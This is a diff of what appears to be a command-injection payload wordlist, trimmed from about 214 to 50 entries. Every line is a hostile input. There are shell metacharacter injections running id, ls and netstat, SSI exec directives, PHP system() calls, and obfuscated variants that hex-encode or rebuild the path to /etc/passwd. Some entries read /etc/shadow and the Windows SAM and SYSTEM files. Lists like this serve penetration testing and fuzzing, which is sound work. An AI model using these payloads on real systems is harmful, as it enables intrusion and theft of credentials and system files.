@@ -1,214 +1,50 @@
 `cat /etc/passwd`
 $(cat /etc/passwd)
 cat</etc/passwd
-{cat,/etc/passwd}
-something%0Acat%20/etc/passwd
-cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
-abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
-`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
-cat ${HOME:0:1}etc${HOME:0:1}passwd
-cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
-test=/ehhh/hmtc/pahhh/hmsswd
-cat `xxd -r -p <<< 2f6574632f706173737764`
-cat `xxd -r -ps <(echo 2f6574632f706173737764)`
-cat ${test//hhh\/hm/}
-cat ${test//hh??hm/}
+;system('cat%20/etc/passwd')
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
-&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
-&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
-&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
-;id;
-;id
-;netstat -a;
-;system('cat%20/etc/passwd')
-;id;
-|id
-|/usr/bin/id
-|id|
-|/usr/bin/id|
-||/usr/bin/id|
-|id;
-||/usr/bin/id;
-;id|
-;|/usr/bin/id|
-\n/usr/bin/id\n
-\nid\n
-\n/usr/bin/id;
-\nid;
-\n/usr/bin/id|
-\nid|
-;/usr/bin/id\n
-;id\n
-|usr/bin/id\n
-|nid\n
-`id`
-`/usr/bin/id`
-a);id
-a;id
-a);id;
-a;id;
-a);id|
-a;id|
-a)|id
-a|id
-a)|id;
-a|id
-a);/usr/bin/id
-a;/usr/bin/id
-a);/usr/bin/id;
-a;/usr/bin/id;
-a);/usr/bin/id|
-a;/usr/bin/id|
-a)|/usr/bin/id
-a|/usr/bin/id
-a)|/usr/bin/id;
-a|/usr/bin/id
-;system('cat%20/etc/passwd')
-;system('id')
-;system('/usr/bin/id')
-%0Acat%20/etc/passwd
-%0A/usr/bin/id
-%0Aid
-%0A/usr/bin/id%0A
-%0Aid%0A
-| id
-& id
-; id
-%0a id %0a
-`id`
-$;/usr/bin/id
 $(`cat /etc/passwd`)
-;cat /etc/passwd
 ;/bin/cat /etc/passwd
-%0Acat%20/etc/passwd
-{{ get_user_file("/etc/passwd") }}
 <!--#exec cmd="/bin/cat /etc/passwd"-->
-<!--#exec cmd="/usr/bin/id;-->
 system('cat /etc/passwd');
 <?php system("cat /etc/passwd");?>
-%0Aid
-%0a id %0a
+cat ${HOME:0:1}etc${HOME:0:1}passwd
+cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+id
+|/usr/bin/id
+||/usr/bin/id;
+;|/usr/bin/id|
+`/usr/bin/id`
 %0Aid%0A
-%0A/usr/bin/id
-%0A/usr/bin/id%0A
-a|id|
-a;id|
-a;id;
-a;id\n
+$;/usr/bin/id
+`id`
+|id
+;id
+;id|
+& id
+&&id
+\nid
+\nid;
+' id
+' & id
+'; id
+" id
+" & id
 dir
 | dir
 ; dir
 $(`dir`)
 & dir
 &&dir
-&& dir
-| dir C:\
-; dir C:\
-& dir C:\
-&& dir C:\
-dir C:\
-| dir C:\Users
-; dir C:\Users
-& dir C:\Users
-&& dir C:\Users
-dir C:\Users
-exec('ls')
-exec('pwd')
-exec('whoami');
-;{$_GET["cmd"]}
-`id`
-|id
-| id
-;id
-;id|
-;id;
-& id
-&&id
-;id\n
-/index.html|id|
-ls
-$(`ls`)
 | ls -l /
 ; ls -l /
-& ls -l /
-&& ls -l /
-ls -l /
-| ls -l /etc/
-; ls -l /etc/
 & ls -l /etc/
 && ls -l /etc/
-ls -l /etc/
-ls -lh /etc/
-| ls -l /home/*
-; ls -l /home/*
-& ls -l /home/*
-&& ls -l /home/*
-ls -l /home/*
-| ls -l /tmp
-; ls -l /tmp
-& ls -l /tmp
-&& ls -l /tmp
-ls -l /tmp
-| ls -l /var/www/*
-; ls -l /var/www/*
-& ls -l /var/www/*
-&& ls -l /var/www/*
-ls -l /var/www/*
-\n/bin/ls -al\n
-netstat
 ;netstat -a;
-| netstat -an
-; netstat -an
-& netstat -an
+|netstat -an
+;netstat -an
+&netstat -an
 && netstat -an
-netstat -an
-\nid|
-\nid;
-\nid\n
-\n/usr/bin/id\n
-system('cat C:\boot.ini');
-system('cat config.php');
-system('ls')
-$(`type C:\boot.ini`)
-&&type C:\\boot.ini
-| type C:\Windows\repair\SAM
-; type C:\Windows\repair\SAM
-& type C:\Windows\repair\SAM
-&& type C:\Windows\repair\SAM
-type C:\Windows\repair\SAM
-| type C:\Windows\repair\SYSTEM
-; type C:\Windows\repair\SYSTEM
-& type C:\Windows\repair\SYSTEM
-&& type C:\Windows\repair\SYSTEM
-type C:\Windows\repair\SYSTEM
-| type C:\WINNT\repair\SAM
-; type C:\WINNT\repair\SAM
-& type C:\WINNT\repair\SAM
-&& type C:\WINNT\repair\SAM
-type C:\WINNT\repair\SAM
-type C:\WINNT\repair\SYSTEM
-| type %SYSTEMROOT%\repair\SAM
-; type %SYSTEMROOT%\repair\SAM
-& type %SYSTEMROOT%\repair\SAM
-&& type %SYSTEMROOT%\repair\SAM
-type %SYSTEMROOT%\repair\SAM
-| type %SYSTEMROOT%\repair\SYSTEM
-; type %SYSTEMROOT%\repair\SYSTEM
-& type %SYSTEMROOT%\repair\SYSTEM
-&& type %SYSTEMROOT%\repair\SYSTEM
-type %SYSTEMROOT%\repair\SYSTEM
-; id
-' id
-' || id
-' & id
-' && id
-'; id
-" id
-" || id
-" | id
-" & id
-" && id
-"; id
-$(`id`)
-& id
-&& id
+abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
+`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
+cat `xxd -r -p <<< 2f6574632f706173737764`
